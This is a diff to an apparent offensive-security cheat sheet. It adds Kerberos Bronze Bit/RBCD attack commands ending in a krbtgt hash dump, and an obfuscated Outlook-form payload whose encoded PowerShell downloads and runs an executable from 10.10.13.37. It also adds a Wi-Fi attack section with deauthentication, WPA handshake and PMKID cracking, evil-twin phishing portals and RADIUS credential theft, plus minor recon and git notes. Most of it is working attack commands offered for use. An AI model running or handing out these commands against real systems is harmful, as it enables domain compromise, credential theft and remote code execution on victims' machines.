@@ -970,7 +970,7 @@ PowerView4 > Set-DomainRBCD DC01 -Clear -Verbose
 Add new machine account:
 
 ```
-$ addcomputer.py -computer-name 'fakemachine1337$' -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC02.megacorp.local 'megacorp.local/snovvcrash:Qwe123!@#'
+$ addcomputer.py -computer-name 'fakemachine1337' -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC02.megacorp.local megacorp.local/snovvcrash:'Qwe123!@#'
 ```
 
 Configure RBCD on the vulnerable host:
@@ -984,7 +984,7 @@ Or
 Ask TGS for LDAP:
 
 ```
-$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'DC01$' -dc-ip 10.10.13.37 'megacorp.local/fakemachine1337$:Passw0rd!'
+$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'DC01' -dc-ip 10.10.13.37 megacorp.local/fakemachine1337:'Passw0rd!'
 $ ...DCSync...
 ```
 
@@ -995,7 +995,7 @@ $ ...DCSync...
 Configure RBCD on the vulnerable host (DC01):
 
 ```
-$ ./rbcd.py -f fakemachine1337 -t DC01 -dc-ip 10.10.13.37 'megacorp.local/snovvcrash:Qwe123!@#'
+$ ./rbcd.py -f fakemachine1337 -t DC01 -dc-ip 10.10.13.37 megacorp.local/snovvcrash:'Qwe123!@#'
 ```
 
 ##### rbcd_permissions
@@ -1006,6 +1006,26 @@ Configure RBCD on the vulnerable host (DC01) via PtH:
 
 ```
 $ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.local -c 'CN=fakemachine1337,CN=Computers,DC=megacorp,DC=local' -u snovvcrash -H 79bfd1ab35c67c19715aea7f06da66ee:79bfd1ab35c67c19715aea7f06da66ee -l 10.10.13.37
+```
+
+##### Bronze Bit
+
+* [blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
+* [blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
+* [gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)
+
+```
+PS > Get-KerberosAESKey -Password 'Passw0rd!' -Salt MEGACORP.LOCALfakemachine1337
+AES128 Key: 01C7B89A74F7AEC1007DED2F3DE0A815
+AES256 Key: 211E8E3134ED797B0A2BF6C36D1A966B3BED2B24E4AAA9ECEED23D0ABF659E98
+```
+
+```
+$ proxychains4 -q addcomputer.py -computer-name 'fakemachine1337' -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC01.megacorp.local 'megacorp.local/athompson:sshhiinnoobbii!!'
+$ proxychains4 -q ./rbcd.py -t 'CN=DC01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.local -c 'CN=fakemachine1337,CN=Computers,DC=megacorp,DC=local' -u 'jops' -H f7b8e6e5af23f06fdbb559d1888261fa:f7b8e6e5af23f06fdbb559d1888261fa -l 10.10.13.37
+$ proxychains4 -q getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' -dc-ip 10.10.13.37 'megacorp.local/fakemachine1337:Passw0rd!'
+$ proxychains4 -q getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' -dc-ip 10.10.13.37 'megacorp.local/fakemachine1337' -hashes :FC525C9683E8FE067095BA2DDC971889 -aesKey 211E8E3134ED797B0A2BF6C36D1A966B3BED2B24E4AAA9ECEED23D0ABF659E98 -force-forwardable
+$ proxychains4 -q secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.10.13.37 -no-pass -k
 ```
 
 
@@ -1310,7 +1330,7 @@ Create cross-trust golden ticket:
 ```
 mimikatz # kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:31337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt
 Or
-$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -user-id 31337 -groups 516 -domain child.megacorp.local -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -extra-sid S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 'DC01$'
+$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -user-id 31337 -groups 516 -domain child.megacorp.local -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -extra-sid S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 'DC01'
 ```
 
 For DCSyncing we'll need only parent domain FQDN (megacorp.local):
@@ -4739,6 +4759,20 @@ PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll))
 
 # Perimeter
 
+* DNS
+	+ `$ nslookup example.com`
+	+ Subdomains & AXFR
+	+ AS details
+	+ $ `whois example.com`
+	+ $ `whois 127.0.0.1`
+	+ Check for DNS Amplification
+* CMS, Stack, Vulns
+	+ WhatWeb, Wappalyzer
+	+ Shodan / Censys / SecurityTrails
+* Google Dorks
+	+ `/robots.txt`
+	+ `/sitemap.xml`
+
 
 
 
@@ -4912,8 +4946,8 @@ Exploit:
 $ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form add --suffix test-form --input vbs-payload.txt --send
 ```
 
-```(vbs-payload.txt)
-CreateObject("WScript.Shell").Run "powershell -exec bypass -enc JABwAHIAbwB4AHkAQQBkAGQAcgA9ACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzACIAKQAuAFAAcgBvAHgAeQBTAGUAcgB2AGUAcgA7ACQAcAByAG8AeAB5AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAOwAkAHAAcgBvAHgAeQAuAEEAZABkAHIAZQBzAHMAPQAkAHAAcgBvAHgAeQBBAGQAZAByADsAJABwAHIAbwB4AHkALgBVAHMAZQBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9ACQAdAByAHUAZQA7ACQAYwBsAGkAZQBuAHQAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAFAAcgBvAHgAeQA9ACQAcAByAG8AeAB5ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMwAuADMANwAvAGgAdAB0AHAAcwA0ADQAMwAuAGUAeABlACIALAAiACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAXABtAHUAcwBpAGMAXABoAHQAdABwAHMANAA0ADMALgBlAHgAZQAiACkAOwAkAGUAeABlAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBjAG8AbQAgAHMAaABlAGwAbAAuAGEAcABwAGwAaQBjAGEAdABpAG8AbgA7ACQAZQB4AGUAYwAuAHMAaABlAGwAbABlAHgAZQBjAHUAdABlACgAIgAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlAFwAbQB1AHMAaQBjAFwAaAB0AHQAcABzADQANAAzAC4AZQB4AGUAIgApAAoA", 0, false
+```(vbs-payload.txt.b64)
+Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuICJwb3dlcnNoZWxsIC1leGVjIGJ5cGFzcyAtZW5jIEpBQndBSElBYndCNEFIa0FRUUJrQUdRQWNnQTlBQ2dBUndCbEFIUUFMUUJKQUhRQVpRQnRBRkFBY2dCdkFIQUFaUUJ5QUhRQWVRQWdBQ0lBU0FCTEFFTUFWUUE2QUZ3QVV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QVRRQnBBR01BY2dCdkFITUFid0JtQUhRQVhBQlhBR2tBYmdCa0FHOEFkd0J6QUZ3QVF3QjFBSElBY2dCbEFHNEFkQUJXQUdVQWNnQnpBR2tBYndCdUFGd0FTUUJ1QUhRQVpRQnlBRzRBWlFCMEFDQUFVd0JsQUhRQWRBQnBBRzRBWndCekFDSUFLUUF1QUZBQWNnQnZBSGdBZVFCVEFHVUFjZ0IyQUdVQWNnQTdBQ1FBY0FCeUFHOEFlQUI1QUQwQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBRk1BZVFCekFIUUFaUUJ0QUM0QVRnQmxBSFFBTGdCWEFHVUFZZ0JRQUhJQWJ3QjRBSGtBT3dBa0FIQUFjZ0J2QUhnQWVRQXVBRUVBWkFCa0FISUFaUUJ6QUhNQVBRQWtBSEFBY2dCdkFIZ0FlUUJCQUdRQVpBQnlBRHNBSkFCd0FISUFid0I0QUhrQUxnQlZBSE1BWlFCRUFHVUFaZ0JoQUhVQWJBQjBBRU1BY2dCbEFHUUFaUUJ1QUhRQWFRQmhBR3dBY3dBOUFDUUFkQUJ5QUhVQVpRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQk9BR1VBZEFBdUFGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFEc0FKQUJqQUd3QWFRQmxBRzRBZEFBdUFGQUFjZ0J2QUhnQWVRQTlBQ1FBY0FCeUFHOEFlQUI1QURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUVRQWJ3QjNBRzRBYkFCdkFHRUFaQUJHQUdrQWJBQmxBQ2dBSWdCb0FIUUFkQUJ3QURvQUx3QXZBREVBTUFBdUFERUFNQUF1QURFQU13QXVBRE1BTndBdkFHZ0FkQUIwQUhBQWN3QTBBRFFBTXdBdUFHVUFlQUJsQUNJQUxBQWlBQ1FBWlFCdUFIWUFPZ0IxQUhNQVpRQnlBSEFBY2dCdkFHWUFhUUJzQUdVQVhBQnRBSFVBY3dCcEFHTUFYQUJvQUhRQWRBQndBSE1BTkFBMEFETUFMZ0JsQUhnQVpRQWlBQ2tBT3dBa0FHVUFlQUJsQUdNQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBTFFCakFHOEFiUUFnQUhNQWFBQmxBR3dBYkFBdUFHRUFjQUJ3QUd3QWFRQmpBR0VBZEFCcEFHOEFiZ0E3QUNRQVpRQjRBR1VBWXdBdUFITUFhQUJsQUd3QWJBQmxBSGdBWlFCakFIVUFkQUJsQUNnQUlnQWtBR1VBYmdCMkFEb0FkUUJ6QUdVQWNnQndBSElBYndCbUFHa0FiQUJsQUZ3QWJRQjFBSE1BYVFCakFGd0FhQUIwQUhRQWNBQnpBRFFBTkFBekFDNEFaUUI0QUdVQUlnQXBBQW9BIiwgMCwgZmFsc2UK
 ```
 
 Cleanup:
@@ -5087,6 +5121,421 @@ PS > Invoke-DomainHarvestOWA -ExchHostname mx.megacorp.com
 ```
 $ python get_ad_domain.zip -m owa mx.megacorp.com
 ```
+
+
+
+
+
+# Wi-Fi
+
+* [www.aircrack-ng.org/doku.php?id=newbie_guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
+* [defkey.com/airodump-ng-shortcuts](https://defkey.com/airodump-ng-shortcuts)
+* [xakep.ru/2020/01/27/wifi-total-pwn/](https://xakep.ru/2020/01/27/wifi-total-pwn/)
+
+
+
+
+## Hardware
+
+
+
+### TP-Link TL-WN722N v2/v3
+
+* [github.com/aircrack-ng/rtl8188eus/tree/v5.3.9](https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9)
+* [codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/](https://codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/)
+
+Chipset: TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS].
+
+Check kernel version:
+
+```
+$ uname -r
+5.8.0-kali2-amd64
+```
+
+Install kernel headers:
+
+```
+$ sudo apt install -y bc linux-headers-amd64
+```
+
+Build drivers from source and install:
+
+```
+$ sudo -i
+# echo "blacklist r8188eu" >> "/etc/modprobe.d/realtek.conf"
+# git clone https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9 /opt/rtl8188eus && cd /opt/rtl8188eus
+# make && make install
+# reboot
+```
+
+Test for packet injections:
+
+```
+$ sudo aireplay-ng -9 wlan1
+```
+
+
+
+### Alfa AWUS036ACH AC1200
+
+* [github.com/aircrack-ng/rtl8812au](https://github.com/aircrack-ng/rtl8812au)
+
+Chipset: Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter.
+
+Install drivers with apt:
+
+```
+$ sudo apt update && sudo apt upgrade -y
+$ sudo apt install realtek-rtl88xxau-dkms
+$ sudo reboot
+```
+
+Or build from source and install:
+
+```
+$ sudo -i
+# git clone https://github.com/aircrack-ng/rtl8812au /opt/rtl8812au && cd /opt/rtl8812au
+# ./dkms-install.sh
+# reboot
+```
+
+Test for packet injections:
+
+```
+$ sudo aireplay-ng -9 wlan1
+```
+
+
+
+
+## Prologue
+
+Install stuff:
+
+```
+$ sudo apt install lshw cowpatty -y
+```
+
+Make sure lsusb can see the wireless adapters (it would show the chipset):
+
+```
+$ lsusb
+Bus 001 Device 003: ID 2357:010c TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]
+Bus 001 Device 010: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
+```
+
+Make sure iwconfig can see the wireless adapter:
+
+```
+$ sudo ifconfig
+$ sudo iwconfig
+$ sudo iw dev
+```
+
+Turn on monitor mode manually:
+
+```
+$ sudo ip link set wlan1 down
+$ sudo iwconfig wlan1 mode monitor
+$ sudo ip link set wlan1 up
+$ sudo iwconfig
+```
+
+Undo:
+
+```
+$ sudo ip link set wlan1 down
+$ sudo iwconfig wlan1 mode managed
+$ sudo ip link set wlan1 up
+$ sudo iwconfig
+```
+
+Or create a separate virtual interface in monitor mode:
+
+```
+$ sudo ip link set wlan1 down
+$ sudo iw dev wlan1 interface add wlan1mon type monitor
+$ sudo ip link set wlan1 up
+$ sudo service NetworkManager restart
+$ sudo iwconfig
+```
+
+Undo:
+
+```
+$ sudo ip link set wlan1 down
+sudo iw dev wlan1mon del
+sudo ip link set wlan1 up
+sudo iwconfig
+```
+
+Or do it with airmon-ng:
+
+```
+$ sudo airmon-ng start wlan1
+```
+
+In fact, that does not need to be done as airodump-ng can put the wireless card into monitor mode automatically:
+
+```
+$ sudo airodump wlan1
+```
+
+Make sure, you're not using the default MAC:
+
+```
+$ macchanger -s wlan1
+```
+
+Restart NM when there are troubles with Internet connection:
+
+```
+$ sudo service NetworkManager restart
+```
+
+
+
+
+## WPA/WPA2
+
+
+
+### Personal
+
+
+#### 4-Way Handshake
+
+* [www.wifi-professionals.com/2019/01/4-way-handshake](https://www.wifi-professionals.com/2019/01/4-way-handshake)
+* [security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work](https://security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work)
+* [www.aircrack-ng.org/doku.php?id=cracking_wpa](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
+* [security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng](https://security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng)
+* [hackware.ru/?p=74](https://hackware.ru/?p=74)
+* [hackware.ru/?p=7542](https://hackware.ru/?p=7542)
+* [hackware.ru/?p=5209](https://hackware.ru/?p=5209)
+
+1\. Look for targets. Save BSSID (`00:00:00:00:00:01`), CH (`9`), ESSID (`SomeEssid`) and STATION (`00:00:00:00:00:02`) if deauth will be required:
+
+```
+$ sudo airodump-ng -M -U wlan1 [-c 36-165 (for 5GHz, see WLAN channels) or just -c 1-200 for all] [--band <abg>]
+qq
+```
+
+2\. Start dumping the target's traffic:
+
+```
+[$ sudo iwconfig wlan1 channel 9]
+$ sudo airodump-ng -c 9 --bssid 00:00:00:00:00:01 -w SomeEssid wlan1
+```
+
+3\. Send DeAuth packets in a separate terminal till `WPA handshake: XX:XX:XX:XX:XX:XX` appears (aggressive):
+
+```
+$ sudo aireplay-ng [-D] -0 2 -a 00:00:00:00:00:01 -c 00:00:00:00:00:02 wlan1
+Or
+$ for client in `cat 00:00:00:00:00:01.txt`; do sudo aireplay-ng -D -0 2 -a 00:00:00:00:00:01 -c $client wlan1; done
+```
+
+4\. Clean the capture, check it once again, covert to Hashcat format and crack it:
+
+```
+$ aircrack-ng SomeEssid*.cap
+$ wpaclean SomeEssid-cleaned.cap SomeEssid-01.cap
+$ cowpatty -r SomeEssid-cleaned.cap -s SomeEssid -c
+$ /usr/lib/hashcat-utils/cap2hccapx.bin SomeEssid-cleaned.cap SomeEssid.hccapx
+$ hashcat -m 2500 -a 0 cleaned.hccapx rockyou.txt
+```
+
+##### wifite2
+
+```
+$ sudo wifite -vi wlan1 --clients-only --wpa --no-wps
+```
+
+
+#### PMKID
+
+* [habr.com/ru/company/jetinfosystems/blog/419383/](https://habr.com/ru/company/jetinfosystems/blog/419383/)
+
+##### wifite2
+
+```
+$ sudo wifite -vi wlan1 --pmkid
+```
+
+
+#### wifite2
+
+* [github.com/derv82/wifite2](https://github.com/derv82/wifite2)
+* [github.com/nuncan/wifite2mod](https://github.com/nuncan/wifite2mod)
+
+> «Поэтому оптимальный алгоритм взло… аудита следующий: определяем, включен ли на целевой точке доступа режим WPS. Если да, запускаем PixieDust. Безуспешно? Тогда перебор известных пинов. Не получилось? Проверяем, не включено ли шифрование WEP, которое тоже обходится влет. Если нет, то выполняем атаку PMKID на WPA(2). Если уж и так не получилось, тогда вспоминаем классику и ждем хендшейка (чтобы не палиться) или активно кикаем клиентов, чтобы наловить их сессии авторизации.» — [\]\[](https://xakep.ru/2020/01/27/wifi-total-pwn/)
+
+Install wifite2:
+
+```
+$ git clone https://github.com/derv82/wifite2 ~/tools/wifite2 && cd ~/tools/wifite2
+$ sudo python setup.py install
+```
+
+Install hcxdumptool (for capturing PMKID hashes):
+
+```
+$ git clone https://github.com/ZerBea/hcxdumptool.git ~/tools/hcxdumptool && cd ~/tools/hcxdumptool
+$ sudo apt install libcurl4-openssl-dev libssl-dev -y
+$ make
+$ sudo make install
+```
+
+Install (for converting PMKID packet captures into hashcat's format):
+
+```
+$ git clone https://github.com/ZerBea/hcxtools.git ~/tools/hcxtools && cd ~/tools/hcxtools
+$ make
+$ sudo make install
+```
+
+Fire up wifite2:
+
+```
+$ sudo wifite -vi wlan1 [--kill] [-5]
+```
+
+
+#### airgeddon
+
+* [github.com/v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
+
+```
+$ git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git ~/tools/airgeddon && cd ~/tools/airgeddon
+$ sudo bash airgeddon.sh
+```
+
+
+#### wifiphisher
+
+* [github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
+* [github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst](https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst)
+
+Install:
+
+```
+$ git clone https://github.com/wifiphisher/wifiphisher.git ~/tools/wifiphisher && cd ~/tools/wifiphisher
+$ sudo python3 setup.py install # Install any dependencies
+```
+
+Start a rogue AP with fake captive portal (firmware update scenario) on wlan1 and deauth clients with wlan2:
+
+```
+$ sudo wifiphisher -aI wlan1 -eI wlan2 -p wifi_connect
+```
+
+
+
+### Enterprise
+
+* [medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2](https://medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2)
+
+
+#### hostapd-wpe
+
+* [pentest.blog/attacking-wpa-enterprise-wireless-network/](https://pentest.blog/attacking-wpa-enterprise-wireless-network/)
+* [teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html](https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html)
+* [codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/](https://codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/)
+
+1\. Install dependencies:
+
+```
+$ sudo apt install libnl-3-dev libssl-dev
+$ sudo apt install hostapd-wpe
+```
+
+2\. Install and configure hostapd-wpe:
+
+```
+$ sudo vi /etc/hostapd-wpe/hostapd-wpe.conf
+...
+interface=wlan1
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ssid=NotEvilTwinAP
+channel=1
+hw_mode=b
+auth_server_addr=127.0.0.1
+auth_server_port=18120
+auth_server_shared_secret=S3cr3t!
+wpa_pairwise=TKIP CCMP
+```
+
+3\. Run fake AP with RADIUS server
+
+```
+$ sudo airmon-ng check kill
+$ sudo /usr/sbin/hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+```
+
+4\. Crack Net-NTLM hashes (mask example)
+
+```
+$ hashcat -m 5500 -a 3 net-ntlmv1.txt -1 ?d?l ?1?1?1?1?1?1?1?1
+$ hashcat -m 5500 -a 3 net-ntlmv1.txt -1 ?d?l?u ?1?1?1?1?1?1?1?1
+$ hashcat -m 5500 -a 3 net-ntlmv1.txt -1 ?d?l?u?s ?1?1?1?1?1?1?1?1
+```
+
+
+#### apd_launchpad
+
+* [github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)
+* [www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html](https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html)
+
+```
+$ python ~/tools/apd_launchpad/apd_launchpad.py -t radius -s MegaCorp -i wlan1 -ch 1 -cn '*.megacorp.local' -o MegaCorp
+$ vi radius/radius.conf
+...
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+```
+
+
+#### EAPHammer
+
+* [github.com/s0lst1c3/eaphammer](https://github.com/s0lst1c3/eaphammer)
+
+Setup:
+
+```
+$ git clone https://github.com/s0lst1c3/eaphammer.git ~/tools/eaphammer && cd ~/tools/eaphammer
+$ sudo ./kali-setup
+$ sudo python3 -m pip install flask-cors flask-socketio --upgrade
+```
+
+Create a certificate:
+
+```
+$ sudo ./eaphammer --cert-wizard
+```
+
+Steal RADIUS creds:
+
+```
+$ sudo ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid Example --channel 1 --interface wlan1 --auth wpa-eap --creds
+```
+
+
+
+
+## Misc
+
+
+
+### WLAN channels
+
+* [en.wikipedia.org/wiki/List_of_WLAN_channels](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
+* [www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png](https://www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png)
+
+
+
+### Signal Strength
+
+* [eyesaas.com/wi-fi-signal-strength/](https://eyesaas.com/wi-fi-signal-strength/)
 
 
 
@@ -6212,6 +6661,19 @@ $ git push -f origin master
 $ git checkout -b dev upstream/dev
 $ git rebase upstream/dev (git merge upstream/dev)
 $ git push -f origin dev
+```
+
+Working with a repository during a pull request:
+
+```
+$ git remote add upstream https://github.com/original/repository.git
+$ git fetch upstream
+$ git rebase upstream/master
+$ git checkout upstream/master
+$ git checkout -b new-pull-request
+...Make changes...
+$ gc -am "New pull request"
+$ git push -u origin new-pull-request
 ```
 
 
